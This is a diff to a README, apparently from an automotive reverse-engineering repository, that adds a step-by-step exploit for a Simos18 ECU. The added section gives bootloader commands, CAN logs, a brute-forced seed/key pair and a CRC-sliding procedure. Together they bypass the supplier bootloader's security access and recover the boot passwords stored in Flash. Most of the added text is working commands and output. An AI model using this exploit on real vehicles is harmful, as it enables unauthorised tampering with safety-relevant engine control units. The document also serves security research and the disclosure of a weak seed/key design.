@@ -84,7 +84,93 @@ We know that the Mersenne Twister seed number is deterministic, since no entropy
 
 Since CAN messages are buffered and processed in a loop pumped using the same timer, with some plausibly tight timing it is possible to "hit" a very close range of Mersenne Twister seed numbers. Because the random data which is encrypted and passed back is not dynamically salted at all, it should be possible to pass back the desired data and pass the seed/key algorithm, using Seed/Key data generated with [this tool](twister.c) . So far, my testing indicates that even with a Raspberry Pi as the tester, the system timer value can be constrained to within a few hundred thousand cycles, reducing the size of the Seed/Key space to a size which can be easily brute-forced on modern hardware. On my M1 MacBook Air, I can enumerate roughly 100,000 pairs per second on a single core.  
 
-Next, we can hopefully use the poor bounds-checking on the CRC to begin a checksum process against the boot passwords as stored in Flash. By then quickly resetting the CPU into BSL, before the process has a chance to run too many iterations, a reasonably small amount of data should be processed before we are able to inspect the state of the checksum routine. And by sliding the start of the CRC, it should be possible to determine the influence of each set of bytes on the CRC and to back-calculate the bytes in question, revealing the boot passwords.
+Next, we can use the poor bounds-checking on the CRC to begin a checksum process against the boot passwords as stored in Flash. By then quickly resetting the CPU into BSL, before the process has a chance to run multiple iterations, we are able to inspect the state of the checksum routine. And by sliding the start of the CRC, it is possible to determine the influence of each set of bytes on the CRC and to back-calculate the bytes in question, revealing the boot passwords.
+
+# Exploit Step-By-Step
+
+The exploit process has been proven out, but not yet automated. So far, the process works like this:
+
+Set up ECU for Bootstrap Loader using https://github.com/bri3d/TC1791_CAN_BSL as a guide. Unfortunately, you will need to open the ECU and probe or solder to several very small vias. This is necessary to allow the use of the CPU RST pin, as well as the upload of a low-level Tricore Bootstrap Loader to read the CRC data out of RAM and access Flash once passwords are recovered.
+
+Use "bootloader.py" from that same repository to perform the following steps:
+
+```
+(BSL) upload
+(...)
+Device jumping into BSL... Draining receive queue...
+```
+The SBOOT entry process is much more reliable when starting from the Bootstrap Loader rather than running ASW. I believe this is due to CAN buffering in Linux getting in the way of the entry messages.
+
+Next:
+
+```
+(BSL) sboot
+Setting up PWM waveforms...
+Resetting ECU into Supplier Bootloader...
+Sending 59 45...
+Timestamp: 1614900054.113193        ID: 07e8    S                DLC:  8    a0 ff ff ff ff ff ff ff     Channel: can0
+Got A0 message...
+Sending 6B...
+Timestamp: 1614900054.114856        ID: 07e8    S                DLC:  8    a0 02 ff ff ff ff ff ff     Channel: can0
+Got A0 message...
+Switching to IsoTP Socket...
+Sending 0x30
+a0
+Sending 0x54
+Seed material is:
+a00000005000000136be284541338a69a6bf21caa369d3079a815f9d5c71359e922495bc27dbe86e6e441702d81e07ca318a98b2e3f83bed6f7e91f3ce375a9703013284e8de83343de688d33f5e8d4bf25f9cae3b191a816743c32a5967414c249658e421ea040b5df7b30b9e69c0a6476653f729db1c75675ce71c0904be57a694c43e243468118ba8cdc1e4b6c23a73c115eede9950051a239d97598707779e14c8ec4584e2a9e155cadfc8d526d77866047070b13d34057cf311b9fa6d9ff5223026fdaa4b722396c57b7858bc290e4320d80c4c1b31dcd1e02cb5e2ec7b4a1aa18fb768a10342328ad5c5e042a8cdfeba7607161308aeabc71c89a819ae6a43a2fa3b4cf45e49
+```
+There's the Seed! This process resets the ECU into the SBOOT Service Mode command shell by sending the correct PWM waveforms, and performs the Seed operation. The timing is controlled enough to allow the next step to work:
+
+```
+Simos18_SBOOT % ./twister 01D00000 be284541
+**** FOUND ****
+Seed: 01D1E4EE
+
+Key Data: 
+ DA0E1828 21C7E6B5 A2BBD143 12F85EFD 9E682543 FE14518B 7611F711 8249AF0E A3C3E370 771EFA0B 172B321E 1B709E32 D7217199 48621483 23B90A28 DFA71B4A 925B0A34 1D304CC9 A6E36B73 70DBDCD5 EA05EDE2 800BB6E0 17793D5C 1A338EF0 AD960625 89C66E02 061D10DE FFDD040D EC59123B E833FDB6 B745EF44 2D32DCF0 81F1CFA8 28B0BD61 E351C52A C7A6F379 5E91489C 4C872318 5888FD89 2C1A3106 DFF03E42 1342237F 3963F5F2 180FCF17 23306BC3 EF5A73EF F734D53A 8B1AC3AD 6CFA8BE3 A2120DF7 38B5B940 181EB813 8816814A 68B604A6 F17221AA A6117FF3 70A251B5 997520F8 EC472D57 092B8960 E5A644C8 6AC5007F 6CEFE33A 0002405E
+Seed Data: 
+ BE284541 338A69A6 BF21CAA3 69D3079A 815F9D5C 71359E92 2495BC27 DBE86E6E 441702D8 1E07CA31 8A98B2E3 F83BED6F 7E91F3CE 375A9703 013284E8 DE83343D E688D33F 5E8D4BF2 5F9CAE3B 191A8167 43C32A59 67414C24 9658E421 EA040B5D F7B30B9E 69C0A647 6653F729 DB1C7567 5CE71C09 04BE57A6 94C43E24 3468118B A8CDC1E4 B6C23A73 C115EEDE 9950051A 239D9759 8707779E 14C8EC45 84E2A9E1 55CADFC8 D526D778 66047070 B13D3405 7CF311B9 FA6D9FF5 223026FD AA4B7223 96C57B78 58BC290E 4320D80C 4C1B31DC D1E02CB5 E2EC7B4A 1AA18FB7 68A10342 328AD5C5 E042A8CD FEBA7607 161308AE ABC71C89 A819AE6A 43A2FA3B 4CF45E49
+ ```
+Next, we use `twister` from this repo to generate the Seed/Key data. The two parameters are 01D00000, the initial timer value to iterate up from, and BE284541, the first 32 bits of the Seed from the above commands. If your tester has different timings (I used a Raspberry Pi 3B+), you may need to increase or decrease the 01D00000 value to find a match in a reasonable amount of time. The faster the machine you can run `twister` on, the better - although it's unfortunately single threaded for the moment.
+
+Now, we go back to the `bootstrap.py` script:
+
+```
+(BSL) sboot_sendkey DA0E182821C7E6B5A2BBD14312F85EFD9E682543FE14518B7611F7118249AF0EA3C3E370771EFA0B172B321E1B709E32D72171994862148323B90A28DFA71B4A925B0A341D304CC9A6E36B7370DBDCD5EA05EDE2800BB6E017793D5C1A338EF0AD96062589C66E02061D10DEFFDD040DEC59123BE833FDB6B745EF442D32DCF081F1CFA828B0BD61E351C52AC7A6F3795E91489C4C8723185888FD892C1A3106DFF03E421342237F3963F5F2180FCF1723306BC3EF5A73EFF734D53A8B1AC3AD6CFA8BE3A2120DF738B5B940181EB8138816814A68B604A6F17221AAA6117FF370A251B5997520F8EC472D57092B8960E5A644C86AC5007F6CEFE33A0002405E
+Sending 0x65
+a0
+```
+We're in! We've passed Seed/Key and we can start sending data to the ECU. Next up:
+
+```
+(BSL) sboot_crc_reset 8001421C
+Resetting ECU into HWCFG BSL Mode...
+Setting initial CRC to 0x0
+a0
+Setting expected CRC to 0x0
+a0
+Setting start CRC range count to 1
+a0
+Setting start CRC start address to boot passwords at 0x8001421C
+a0
+Setting start CRC end address to a valid area at 0xb0010130
+a0
+Uploading valid part number for part correlation validator
+a0
+Starting Validator and rebooting into BSL...
+Sending BSL initialization message...
+Sending BSL data...
+100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 537/537 [00:00<00:00, 827blocks/s]
+Device jumping into BSL... Draining receive queue...
+(BSL) readaddr d0010770
+1c430180
+(BSL) readaddr d0010778
+f4ec5c4e
+```
+Here, we upload a small fake code block to the SBOOT command shell, consisting of a CRC header telling the shell to begin CRC checking at a specified address, 0x8001420C, and some fixed part number data necessary to pass a validator. Next, we read back the CRC and end address (to make sure only a single iteration of the CRC algorithm was allowed to progress). Now we have the CRC value for 0x8001421C-0x8001431C! An astute reader will note that this range is actually after the boot passwords and contains some crypto data from OTP (the Mersenne Twister seed and the beginning of the AES K-values, I think) - this lets us verify that our system is working, since we can checksum the known data and compare the result.
+
+To actually recover passwords, we need to repeat this process, sliding the checksum value backwards 4 bytes at a time. Each time we slide the checksum value backwards, we can use https://github.com/resilar/crchack to generate the necessary data to match the checksum. By performing this process iteratively back to the boot passwords at 0x8001420C, we can infer their value.
 
 # Happy Path
 
